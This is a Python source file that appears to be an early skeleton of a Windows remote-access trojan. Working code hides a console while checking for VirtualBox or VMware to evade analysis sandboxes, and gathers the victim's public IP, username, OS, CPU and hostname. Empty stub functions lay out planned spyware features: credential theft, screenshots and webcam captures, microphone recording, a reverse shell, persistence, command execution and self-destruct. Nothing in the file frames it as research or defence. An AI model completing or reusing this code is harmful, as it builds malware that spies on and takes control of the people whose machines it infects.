
import subprocess as sp
from urllib.request import urlopen
import platform
import json
import ctypes
import re
import os


def autoPersistent():
    pass


def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr \"System Info\"",
                       stderr = sp.PIPE,
                       stdin = sp.DEVNULL,
                       stdout = sp.PIPE,
                       shell = True,
                       text = True,
                       creationflags = 0x08000000)
    
    out, err = command.communicate()
    command.wait()
    
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False    


def isAdmin():
    """try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAdmin() != 0
    except Exception:
        is_admin = False"""
    is_admin = False
    return is_admin


def getIP():
    url = 'https://api.myip.com'
    try:
        response = urlopen(url)
        IP = json.loads(response.read())['ip']
    except Exception:
        IP = "None"
    return IP


def getBits():
    try:
        BITS = platform.architecture()[0]
    except Exception:
        BITS = "None"
    return BITS


def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME


def getOS():
    try:
        OS = platform.platform()
    except Exception:
        OS = "None"
    return OS


def getCPU():
    try:
        CPU = platform.processor()
    except Exception:
        CPU = "None"
    return CPU


def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception:
        HOSTNAME = "None"
    return HOSTNAME


def createConfig():
    pass


def id():
    pass


def cd(path):
    pass


def process():
    pass


def upload(url, name):
    pass


def screenshot():
    pass


def webshot():
    pass


def creds():
    pass


def persistent():
    pass


def cmd(command):
    pass


def selfdestruct():
    pass


def location():
    pass


def revshell(ip, port):
    pass


def recordmic(seconds):
    pass


def wallpaper(path):
    pass


def killproc(pid):
    pass

